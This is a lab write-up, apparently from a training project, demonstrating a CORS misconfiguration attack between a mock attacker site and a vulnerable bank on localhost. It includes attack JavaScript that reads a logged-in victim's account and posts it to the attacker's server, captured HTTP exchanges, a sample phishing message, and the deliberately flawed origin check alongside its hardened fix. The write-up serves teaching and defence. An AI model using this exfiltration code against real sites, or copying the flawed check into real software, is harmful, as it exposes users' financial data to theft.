# CORS misconfiguration: reading Alice's account from another site

A page on Mallory's site asks Alice's browser to fetch her account from the bank, with her cookies, and reads the answer. The vulnerable bank says yes because it checks the requesting origin with a substring match. The hardened bank says no twice. Exact steps to reproduce it are in [ATTACKS.md](../ATTACKS.md).

Setup: Alice is logged in to both banks in a normal Chrome window. Incognito won't work for this one, because it blocks third-party cookies by default.

## Vulnerable bank

### Alice visits the wrong site

Misfortune strikes Alice once again. This time she doesn't need to do anything clever, only open a link. It could arrive in a phishing email ("Your TS Bank statement is ready"), in an ad, or in a post on the bank's own community board, which we already know Mallory enjoys. The page lives on `evilbank.localhost`. A name that contains the bank's name looks trustworthy to a hurried human, and as it turns out, to the bank as well.

In the lab the attack waits for a button press, so both banks can be compared side by side. A real attack page would run on load while Alice reads a fake statement.

### What the page does

The core of the attack page, for one bank:

```js
const res = await fetch('http://bank.localhost:3000/api/account', { credentials: 'include' });
const text = await res.text();
fetch('/report', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ kind: 'cors-read', target: 'vulnerable', data: text }),
});
```

1. `credentials: 'include'` asks the browser to attach Alice's cookies for `bank.localhost`. Her session cookie is `SameSite=None`, and Chrome still allows third-party cookies, so it goes along.
2. A plain GET with no custom headers counts as a "simple" request, so there is no preflight. The request reaches the bank and the bank answers in full. CORS only decides whether the page that made the request may read the response.
3. Before handing the response to the script, the browser checks two headers. `Access-Control-Allow-Origin` must equal the page's origin exactly, and because cookies were sent, `Access-Control-Allow-Credentials` must be `true`. Both are present, so `res.text()` returns Alice's account.
4. The second `fetch` posts the loot to Mallory's own server. That one is same-origin for his page, so nothing stands in the way.

The browser refuses `Access-Control-Allow-Origin: *` when credentials are involved. That rule is the reason so many servers echo the request's `Origin` back instead, and echoing it after a sloppy check is how this bug happens.

### The request and the response

Request to the vulnerable bank, from DevTools → Network:

```http
GET /api/account HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive
Cookie: sid=YqHd-nVrtipYbbfRpSpdugCX_al6pdMv6P8kQA7f5-w
Host: bank.localhost:3000
If-None-Match: W/"6f-/YuI2wyNqURSq0BP4YspyftIb0M"
Origin: http://evilbank.localhost:4000
Referer: http://evilbank.localhost:4000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Sec-Fetch-Storage-Access: active
User-Agent: [REDACTED]
sec-ch-ua: "Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
```

The browser is honest about everything here. `Origin` names Mallory's site, `Sec-Fetch-Site` says `cross-site`, and the session cookie is attached anyway. The bank had all the information it needed to refuse.

`If-None-Match` means Chrome already had a cached copy of this response from an earlier run. Nothing told it not to keep one, so Alice's account details, CSRF token included, were sitting in the browser cache.

Response:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src * data:
Vary: Origin
Access-Control-Allow-Origin: http://evilbank.localhost:4000
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Content-Length: 185
ETag: W/"b9-x2HJ8iHKpJWgvWf6D5hXXjHmGe4"
Date: Mon, 09 Nov 2026 13:42:26 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

```json
{
    "username": "alice",
    "balance": 950,
    "csrfToken": "jPk7eZ_vDKd9Rz_sJZ7oZQKfSCSzoshReAcNS6T9XQw",
    "transactions": [
        {
            "at": "2026-11-09T13:42:19.727Z",
            "from": "alice",
            "to": "mallory",
            "amount": 50
        }
    ]
}
```

Two lines do all the damage: `Access-Control-Allow-Origin` echoes Mallory's origin and `Access-Control-Allow-Credentials: true` lets him read a response made with Alice's cookie. `Vary: Origin` is correct, at least, so a cache won't serve this answer to someone else. The CSP header is here too, faithfully guarding a JSON document that nobody renders.

![Loot panel: Alice's account data from the vulnerable bank, a blocked request from the hardened one](images/CORS-misconfiguration/loot-panel.png)

### Reading the logs

```
bank-safe-1  | [bank-safe] GET /account  origin=-  session-cookie=yes
bank-safe-1  | [bank-safe] GET /static/style.css  origin=-  session-cookie=yes
attacker-1   | [attacker] GET evilbank.localhost/cors  persona=evilbank
attacker-1   | [attacker] GET evilbank.localhost/.well-known/appspecific/com.chrome.devtools.json  persona=evilbank
bank-safe-1  | [bank-safe] GET /api/account  origin=http://evilbank.localhost:4000  session-cookie=no
bank-safe-1  | [bank-safe]   CORS: rejected origin http://evilbank.localhost:4000
bank-vuln-1  | [bank-vuln] GET /api/account  origin=http://evilbank.localhost:4000  session-cookie=yes
bank-vuln-1  | [bank-vuln]   CORS: allowed origin http://evilbank.localhost:4000
attacker-1   | [attacker] POST evilbank.localhost/report  persona=evilbank
attacker-1   | [attacker]   REPORT blocked from hardened
attacker-1   | [attacker] POST evilbank.localhost/report  persona=evilbank
attacker-1   | [attacker]   REPORT cors-read from vulnerable
```

The two `/api/account` lines tell the whole story. The vulnerable bank received Alice's cookie and allowed the origin. The hardened bank received no cookie and rejected the origin, so it failed the request for two independent reasons.

## Impact

What Mallory got from a single page view:

- Alice's balance and transaction history: who she pays, how much and when. Here that is one €50 transfer to Mallory, which is a little awkward for him. On a real account it would be rent, salary, the pharmacy and everything else, laid out in a table. For a real bank this would also be a personal data breach.
- Material for a very convincing phishing message. Real details make a fake message hard to doubt:

  > Hi Alice, your €50 transfer to mallory on 9 November was flagged by our fraud team. Please confirm it here within 24 hours.

- Alice's CSRF token. The vulnerable bank never checks it, so here it's a souvenir. On a bank that does check it, the token is what lets Mallory forge transfers anyway (the CSRF flow shows the forging part), so this bug quietly cancels another defence.
- Scale. There's no XSS involved and nothing to click beyond the link. Every logged-in customer who opens the page is affected, and a real version would fire on load.

What Mallory didn't get is the session cookie itself. CORS exposes response bodies, and the cookie never appears in one. He can read as Alice only while she has his page open. Anything lasting needs the token or a second bug.

## What went wrong

### 1. A substring check on the origin

This is the root cause:

```ts
// vulnerable.ts
isAllowedOrigin: (origin) => origin !== undefined && origin.includes('bank.localhost'),
```

`http://evilbank.localhost:4000` contains `bank.localhost`, so it passes. Anyone who can register a domain with the bank's name inside it gets in. The same family of mistakes shows up in real code as `endsWith('bank.com')` (passes `evilbank.com`), `startsWith('https://bank.com')` (passes `https://bank.com.evil.net`), a regex with an unescaped dot, or reflecting every origin outright. Trusting the literal origin `null` is another favourite, since sandboxed iframes can send it on demand.

The hardened bank parses the origin and compares it against a fixed set:

```ts
// hardened.ts
isAllowedOrigin: (origin) => {
  if (origin === undefined) return false;
  try {
    return allowlist.has(new URL(origin).origin);
  } catch {
    return false; // includes the literal string "null"
  }
},
```

### 2. Credentials allowed for an echoed origin

`Access-Control-Allow-Credentials: true` is the dangerous half of the pair. Without it, the browser would still send the request, but would hide any response that was made with cookies. With it, a validation bug in one line turns into full read access to whatever the logged-in user can see.

### 3. The session cookie travels cross-site

`SameSite=None` is what put Alice's cookie on a request started by Mallory's page. With `SameSite=Lax` or `Strict` the bank would have received an anonymous request and answered `401`, leaving nothing worth reading even with the broken CORS check. That is exactly what happened on the hardened side.

`HttpOnly` doesn't help here. It hides the cookie from JavaScript on the bank's pages, but the browser still attaches it to requests, and Mallory never needs to see the cookie itself.

### 4. The API hands out the CSRF token

`/api/account` returns `csrfToken` along with the balance. The vulnerable bank never checks that token, but a bank that did would now have its CSRF protection undone by a CORS bug. Secrets that protect one feature shouldn't ride along in responses another bug can expose.

### 5. No `Cache-Control: no-store`

The `If-None-Match` header shows Chrome kept a copy of Alice's account JSON. Anyone with access to the browser profile later could find it. Neither bank sets `no-store` on authenticated responses yet.

### What each layer would have stopped

| Control | Effect on this attack |
| --- | --- |
| Exact-match origin allowlist | Browser refuses to hand the response to Mallory's page |
| `SameSite=Lax` or `Strict` | Cookie isn't sent; the bank answers `401` with nothing to steal |
| Keeping the CSRF token out of the API | Limits the loot to account data |
| `Cache-Control: no-store` | Nothing for the theft; no copies left in the browser cache |
| `HttpOnly` | Nothing. The browser still attaches the cookie |
| The bank's CSP | Nothing. CSP restricts what the bank's own pages load, and this request starts on Mallory's page |

## Hardened bank

Same page, same button. The hardened bank's column shows "Blocked by the browser".

Its response to the very same request:

```http
HTTP/1.1 401 Unauthorized
X-Frame-Options: DENY
Content-Security-Policy: default-src 'none'; script-src 'nonce-ujs2dRgEaABK/3p1QfSbkw==' 'strict-dynamic'; style-src 'self'; img-src 'self'; connect-src 'self'; form-action 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Vary: Origin
Content-Type: application/json; charset=utf-8
Content-Length: 25
ETag: W/"19-B2pGg+XUliC8g8HxoPYXv6iF8c0"
Date: Mon, 09 Nov 2026 13:14:47 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

`401` because the `SameSite=Lax` cookie stayed home, and no `Access-Control-Allow-*` headers because `evilbank.localhost` isn't on the list. Either one alone would have been enough.

![Console: CORS policy blocked the fetch; GET /api/account failed with 401](console-cors-error.png)

DevTools can see the `401`. The page can't: Mallory's script only gets `TypeError: Failed to fetch`. Without the CORS headers the browser hides everything about the response from the page, even the status code, so the attacker can't use error messages to learn whether Alice is logged in.

### Checking it without a browser

curl ignores CORS entirely, which makes it a good way to look at the server's decision on its own:

```
~ % curl -s -D - -o /dev/null -H 'Origin: http://evilbank.localhost:4000' http://bank.localhost:3000/api/account | grep -i access-control
Access-Control-Allow-Origin: http://evilbank.localhost:4000
Access-Control-Allow-Credentials: true
~ % curl -s -D - -o /dev/null -H 'Origin: http://evilbank.localhost:4000' http://bank-safe.localhost:3001/api/account | grep -i access-control
~ %
```

There's no cookie in these requests, so both banks answered `401`. The vulnerable one still granted Mallory's origin access to that `401`. The CORS decision happens before anyone checks who is logged in.

## Takeaway

The vulnerable bank's pages were fine. Two response headers on an API did the damage: one echoing whatever origin looked familiar and one allowing cookies along for the ride. The fix is deliberately boring, an exact comparison against a list. `SameSite=Lax` stopped the same attack independently, which is the kind of redundancy you want when the first line of defence is a single line of string matching.
